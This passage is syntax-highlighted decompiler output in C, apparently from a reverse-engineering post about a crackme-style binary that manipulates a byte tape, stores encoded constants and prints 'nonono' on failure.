class="hljs-keyword">if</span> ( v57 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_128:</span><br><span class="line">      v59 = v58 - v57;</span><br><span class="line">      v60 = v57 - <span class="hljs-number">1</span>;</span><br><span class="line">      v61 = v56 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v56 - <span class="hljs-number">1</span>) = v60;</span><br><span class="line">      *v56 = v59 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v60 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_129;</span><br><span class="line">      --v56;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  v61 = v56 - <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_129:</span><br><span class="line">  v50 = v56 - <span class="hljs-number">2</span>;</span><br><span class="line">  v56 = v61;</span><br><span class="line">LABEL_130:</span><br><span class="line">  *(_WORD *)v56 = <span class="hljs-number">123</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v55 &amp;&amp; (*v56 = <span class="hljs-string">'{'</span> - v55, v55 == <span class="hljs-string">'{'</span>) )</span><br><span class="line">  {</span><br><span class="line">    ++*(v56 - <span class="hljs-number">2</span>);</span><br><span class="line">    *(v56 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    *(v56 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    *v56 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_133:</span><br><span class="line">  v62 = v50 - <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !*(v50 - <span class="hljs-number">1</span>) )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_150;</span><br><span class="line">  *v50 = <span class="hljs-number">0</span>;</span><br><span class="line">  v63 = <span class="hljs-number">0</span>;</span><br><span class="line">  *(v50 - <span class="hljs-number">1</span>) = <span class="hljs-number">37</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v62[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    v64 = v62++;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v63 )</span><br><span class="line">    {</span><br><span class="line">      v65 = *(v62 - <span class="hljs-number">1</span>);</span><br><span class="line">      ++v63;</span><br><span class="line">      *v62 = <span class="hljs-number">0</span>;</span><br><span class="line">      v62[<span class="hljs-number">1</span>] = v63;</span><br><span class="line">      v66 = v65 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v62 - <span class="hljs-number">1</span>) = v65 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v65 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_135;</span><br><span class="line">    }</span><br><span class="line">    v65 = *(v62 - <span class="hljs-number">1</span>);</span><br><span class="line">    v63 = <span class="hljs-number">1</span>;</span><br><span class="line">    v66 = v65 - <span class="hljs-number">1</span>;</span><br><span class="line">    *(v62 - <span class="hljs-number">1</span>) = v65 - <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v65 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_135:</span><br><span class="line">      *v62 = v65 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v62 - <span class="hljs-number">1</span>) = v66 - v65 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v64[<span class="hljs-number">3</span>] )</span><br><span class="line">    v62[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v62[<span class="hljs-number">3</span>] )</span><br><span class="line">  {</span><br><span class="line">    v67 = *(v62 - <span class="hljs-number">42</span>);</span><br><span class="line">    v62[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v67 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_142;</span><br><span class="line">LABEL_289:</span><br><span class="line">    v67 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v67 = *(v62 - <span class="hljs-number">42</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v67 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_289;</span><br><span class="line">LABEL_142:</span><br><span class="line">    *(v62 - <span class="hljs-number">42</span>) = v67;</span><br><span class="line">    *v62 = v67;</span><br><span class="line">    *((_WORD *)v62 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v68 = v62 + <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v63 )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_147;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v67 )</span><br><span class="line">    {</span><br><span class="line">      v69 = *v68;</span><br><span class="line">      v67 += *(v68 - <span class="hljs-number">2</span>);</span><br><span class="line">      *(v68 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v68 - <span class="hljs-number">2</span>) = v67;</span><br><span class="line">      v70 = v69 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v68 = v69 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v69 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_146;</span><br><span class="line">    }</span><br><span class="line">    v69 = *v68;</span><br><span class="line">    v67 = *(v68 - <span class="hljs-number">2</span>);</span><br><span class="line">    v70 = *v68 - <span class="hljs-number">1</span>;</span><br><span class="line">    *v68 = v70;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v69 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_146:</span><br><span class="line">      *--v68 = v69 - <span class="hljs-number">1</span>;</span><br><span class="line">      v68[<span class="hljs-number">1</span>] = v70 - v69 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  --v68;</span><br><span class="line">LABEL_147:</span><br><span class="line">  v62 = v68 - <span class="hljs-number">1</span>;</span><br><span class="line">  *(_WORD *)v68 = <span class="hljs-number">125</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v67 &amp;&amp; (*v68 = <span class="hljs-string">'}'</span> - v67, v67 == <span class="hljs-string">'}'</span>) )</span><br><span class="line">  {</span><br><span class="line">    ++*(v68 - <span class="hljs-number">2</span>);</span><br><span class="line">    *(v68 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    *(v68 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    *v68 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_150:</span><br><span class="line">  <span class="hljs-keyword">if</span> ( *(v62 - <span class="hljs-number">2</span>) )</span><br><span class="line">    *(v62 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  v71 = *(v62 - <span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v71 )</span><br><span class="line">  {</span><br><span class="line">    *(v62 - <span class="hljs-number">2</span>) = v71;</span><br><span class="line">    *(v62 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v4 = *(v62 - <span class="hljs-number">3</span>) == <span class="hljs-number">0</span>;</span><br><span class="line">  *v62 = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v4 || (v4 = *(v62 - <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>, v62[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>, *v62 = <span class="hljs-number">0</span>, v4) )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">putc</span>(<span class="hljs-string">'n'</span>, _bss_start);</span><br><span class="line">    <span class="hljs-built_in">putc</span>(<span class="hljs-string">'o'</span>, _bss_start);</span><br><span class="line">    <span class="hljs-built_in">putc</span>(<span class="hljs-string">'n'</span>, _bss_start);</span><br><span class="line">    <span class="hljs-built_in">putc</span>(<span class="hljs-string">'o'</span>, _bss_start);</span><br><span class="line">    <span class="hljs-built_in">putc</span>(<span class="hljs-string">'n'</span>, _bss_start);</span><br><span class="line">    <span class="hljs-built_in">putc</span>(<span class="hljs-string">'o'</span>, _bss_start);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  *(_WORD *)v62 = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v4 = v62[<span class="hljs-number">9</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">    *(v62 - <span class="hljs-number">3</span>) = <span class="hljs-number">1</span>;</span><br><span class="line">    v72 = v62 + <span class="hljs-number">33</span>;</span><br><span class="line">    *(_QWORD *)(v62 + <span class="hljs-number">1</span>) = <span class="hljs-number">0x2035550545A0F53</span>LL;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">      v62[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v4 = v62[<span class="hljs-number">16</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">    *(_DWORD *)(v62 + <span class="hljs-number">10</span>) = <span class="hljs-number">0x7075607</span>;</span><br><span class="line">    *((_WORD *)v62 + <span class="hljs-number">7</span>) = <span class="hljs-number">0x95B</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">      v62[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v4 = v62[<span class="hljs-number">36</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">    *(v62 - <span class="hljs-number">4</span>) = <span class="hljs-number">5</span>;</span><br><span class="line">    *(_QWORD *)(v62 + <span class="hljs-number">17</span>) = <span class="hljs-number">0x51505C5D03020550</span>LL;</span><br><span class="line">    *(_QWORD *)(v62 + <span class="hljs-number">25</span>) = <span class="hljs-number">0x340757025F5A5452</span>LL;</span><br><span class="line">    *(_WORD *)(v62 + <span class="hljs-number">33</span>) = <span class="hljs-number">0x2405</span>;</span><br><span class="line">    v62[<span class="hljs-number">35</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">      v62[<span class="hljs-number">36</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v73 = <span class="hljs-number">5</span>;</span><br><span class="line">    v74 = <span class="hljs-number">36</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v73 )</span><br><span class="line">    {</span><br><span class="line">      v62[<span class="hljs-number">33</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      v62[<span class="hljs-number">36</span>] = v73;</span><br><span class="line">      v62[<span class="hljs-number">33</span>] = v73--;</span><br><span class="line">      v62[<span class="hljs-number">36</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      v62[<span class="hljs-number">33</span>] = v73;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !--v74 )</span><br><span class="line">      {</span><br><span class="line">        *((_WORD *)v62 + <span class="hljs-number">17</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v73 )</span><br><span class="line">          v62[<span class="hljs-number">33</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">LABEL_168:</span><br><span class="line">        *(v72 - <span class="hljs-number">37</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_169;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">      --v74;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v74 );</span><br><span class="line">    *((_WORD *)v62 + <span class="hljs-number">17</span>) = <span class="hljs-number">0x100</span>;</span><br><span class="line">    v62[<span class="hljs-number">33</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    v62[<span class="hljs-number">35</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v112 = <span class="hljs-number">5</span>;</span><br><span class="line">LABEL_309:</span><br><span class="line">    *v72 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v112 )</span><br><span class="line">    {</span><br><span class="line">      v116 = v72 + <span class="hljs-number">2</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_315;</span><br><span class="line">    }</span><br><span class="line">    *v72 = v112;</span><br><span class="line">    v113 = v72 + <span class="hljs-number">2</span>;</span><br><span class="line">    *v113 = v112;</span><br><span class="line">    *(v113 - <span class="hljs-number">39</span>) = v112;</span><br><span class="line">    v112 = <span class="hljs-number">0</span>;</span><br><span class="line">    *(v113 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    v113[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v113[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v112 )</span><br><span class="line">      {</span><br><span class="line">        v114 = *v113;</span><br><span class="line">        ++v112;</span><br><span class="line">        v113[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        v113[<span class="hljs-number">2</span>] = v112;</span><br><span class="line">        v115 = v114 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v113 = v114 - <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v114 == <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v116 = v113 + <span class="hljs-number">1</span>;</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_315;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_311;</span><br><span class="line">      }</span><br><span class="line">      v114 = *v113;</span><br><span class="line">      v115 = *v113 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v113 = v115;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v114 != <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v112 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_311:</span><br><span class="line">        *++v113 = v114 - <span class="hljs-number">1</span>;</span><br><span class="line">        *(v113 - <span class="hljs-number">1</span>) = v115 - v114 + <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    v116 = v113 + <span class="hljs-number">1</span>;</span><br><span class="line">    v112 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_315:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v116[<span class="hljs-number">2</span>] )</span><br><span class="line">      v116[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v116[<span class="hljs-number">3</span>] )</span><br><span class="line">    {</span><br><span class="line">      v117 = *(v116 - <span class="hljs-number">77</span>);</span><br><span class="line">      v116[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v117 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_319;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v117 = *(v116 - <span class="hljs-number">77</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v117 )</span><br><span class="line">      {</span><br><span class="line">LABEL_319:</span><br><span class="line">        *v116 += v117;</span><br><span class="line">        *(v116 - <span class="hljs-number">77</span>) = v117;</span><br><span class="line">        *((_WORD *)v116 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    v118 = v116 + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v112 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v119 = *(v118 - <span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v119 )</span><br><span class="line">        {</span><br><span class="line">          *(v118 - <span class="hljs-number">2</span>) += v119;</span><br><span class="line">          *(v118 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        v120 = (*v118)--;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v120 == <span class="hljs-number">1</span> )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        *--v118 = v120 - <span class="hljs-number">1</span>;</span><br><span class="line">        v118[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      --v118;</span><br><span class="line">    }</span><br><span class="line">    v122 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v118[<span class="hljs-number">1</span>] )</span><br><span class="line">    {</span><br><span class="line">      v121 = *(v118 - <span class="hljs-number">40</span>);</span><br><span class="line">      v118[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v121 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_327;</span><br><span class="line">LABEL_326:</span><br><span class="line">      *(v118 - <span class="hljs-number">40</span>) = v121;</span><br><span class="line">      v122 = v121;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_327;</span><br><span class="line">    }</span><br><span class="line">    v121 = *(v118 - <span class="hljs-number">40</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v121 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_326;</span><br><span class="line">LABEL_327:</span><br><span class="line">    v123 = v122 + <span class="hljs-number">1</span>;</span><br><span class="line">    *(_WORD *)v118 = (<span class="hljs-keyword">unsigned</span> __int8)(v122 + <span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v122 == <span class="hljs-number">-1</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_333;</span><br><span class="line">    v123 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v118[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v123 )</span><br><span class="line">      {</span><br><span class="line">        v124 = *v118;</span><br><span class="line">        ++v123;</span><br><span class="line">        v118[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        v118[<span class="hljs-number">2</span>] = v123;</span><br><span class="line">        v125 = v124 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v118 = v124 - <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v124 == <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          ++v118;</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_333;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_329;</span><br><span class="line">      }</span><br><span class="line">      v124 = *v118;</span><br><span class="line">      v125 = *v118 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v118 = v125;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v124 != <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v123 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_329:</span><br><span class="line">        *++v118 = v124 - <span class="hljs-number">1</span>;</span><br><span class="line">        *(v118 - <span class="hljs-number">1</span>) = v125 - v124 + <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    ++v118;</span><br><span class="line">    v123 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_333:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v118[<span class="hljs-number">2</span>] )</span><br><span class="line">      v118[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v118[<span class="hljs-number">3</span>] )</span><br><span class="line">    {</span><br><span class="line">      v126 = *(v118 - <span class="hljs-number">78</span>);</span><br><span class="line">      v118[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v126 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_337;</span><br><span class="line">LABEL_450:</span><br><span class="line">      v126 = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v126 = *(v118 - <span class="hljs-number">78</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v126 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_450;</span><br><span class="line">LABEL_337:</span><br><span class="line">      *(v118 - <span class="hljs-number">78</span>) = v126;</span><br><span class="line">      *v118 = v126;</span><br><span class="line">      *((_WORD *)v118 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v127 = v118 + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v123 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_342;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v126 )</span><br><span class="line">      {</span><br><span class="line">        v128 = *v127;</span><br><span class="line">        v126 += *(v127 - <span class="hljs-number">2</span>);</span><br><span class="line">        *(v127 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        *(v127 - <span class="hljs-number">2</span>) = v126;</span><br><span class="line">        v129 = v128 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v127 = v128 - <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v128 == <span class="hljs-number">1</span> )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_341;</span><br><span class="line">      }</span><br><span class="line">      v128 = *v127;</span><br><span class="line">      v126 = *(v127 - <span class="hljs-number">2</span>);</span><br><span class="line">      v129 = *v127 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v127 = v129;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v128 != <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_341:</span><br><span class="line">        *--v127 = v128 - <span class="hljs-number">1</span>;</span><br><span class="line">        v127[<span class="hljs-number">1</span>] = v129 - v128 + <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    --v127;</span><br><span class="line">LABEL_342:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v127[<span class="hljs-number">5</span>] )</span><br><span class="line">      v127[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v127[<span class="hljs-number">7</span>] )</span><br><span class="line">      v127[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v127[<span class="hljs-number">6</span>] )</span><br><span class="line">      v127[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v130 = v127[<span class="hljs-number">3</span>];</span><br><span class="line">    v131 = *(v127 - <span class="hljs-number">2</span>);</span><br><span class="line">    v132 = <span class="hljs-number">0</span>;</span><br><span class="line">    v133 = <span class="hljs-number">0</span>;</span><br><span class="line">    v134 = <span class="hljs-number">-8</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v135 = v134 + <span class="hljs-number">8</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v127[<span class="hljs-number">4</span>] )</span><br><span class="line">        v127[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v130 )</span><br><span class="line">        v127[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v127[<span class="hljs-number">2</span>] )</span><br><span class="line">        v127[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v127[<span class="hljs-number">1</span>] )</span><br><span class="line">        v127[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      v136 = v131;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v131 )</span><br><span class="line">      {</span><br><span class="line">        v131 = <span class="hljs-number">0</span>;</span><br><span class="line">        v137 = <span class="hljs-number">2</span>;</span><br><span class="line">        <span class="hljs-keyword">do</span></span><br><span class="line">        {</span><br><span class="line">          <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">          {</span><br><span class="line">            v138 = v137;</span><br><span class="line">            --v136;</span><br><span class="line">            v137 = (<span class="hljs-keyword">unsigned</span> __int8)v127[<span class="hljs-number">1</span>];</span><br><span class="line">            <span class="hljs-keyword">if</span> ( (_BYTE)v138 == <span class="hljs-number">1</span> )</span><br><span class="line">            {</span><br><span class="line">              v139 = <span class="hljs-number">-1</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">else</span></span><br><span class="line">            {</span><br><span class="line">              v137 = v138 + v137 - <span class="hljs-number">1</span>;</span><br><span class="line">              v139 = v138 - <span class="hljs-number">2</span>;</span><br><span class="line">              v127[<span class="hljs-number">1</span>] = v137;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">if</span> ( (_BYTE)v137 )</span><br><span class="line">              v127[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">            ++v132;</span><br><span class="line">            <span class="hljs-keyword">if</span> ( !(_BYTE)v139 )</span><br><span class="line">              <span class="hljs-keyword">break</span>;</span><br><span class="line">            v131 -= v139;</span><br><span class="line">            v140 = ~v139;</span><br><span class="line">            v137 += <span class="hljs-number">2</span> * v140 + <span class="hljs-number">2</span>;</span><br><span class="line">            v127[<span class="hljs-number">2</span>] = v131;</span><br><span class="line">            v132 = v132 - <span class="hljs-number">2</span> * v140 - <span class="hljs-number">2</span>;</span><br><span class="line">            <span class="hljs-keyword">if</span> ( !v136 )</span><br><span class="line">              <span class="hljs-keyword">goto</span> LABEL_365;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">while</span> ( v136 );</span><br><span class="line">LABEL_365:</span><br><span class="line">        v127[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        v127[<span class="hljs-number">5</span>] = v132;</span><br><span class="line">        *(v127 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v131 )</span><br><span class="line">        {</span><br><span class="line">          *(v127 - <span class="hljs-number">2</span>) = v131;</span><br><span class="line">          v127[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      v141 = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v126 )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">LOBYTE</span>(v143) = <span class="hljs-number">2</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( (_BYTE)v132 )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_380;</span><br><span class="line">LABEL_441:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( (_BYTE)v134 != <span class="hljs-number">0xF8</span> )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_381;</span><br><span class="line">        v134 = <span class="hljs-number">-7</span>;</span><br><span class="line">LABEL_388:</span><br><span class="line">        v132 = (<span class="hljs-keyword">unsigned</span> 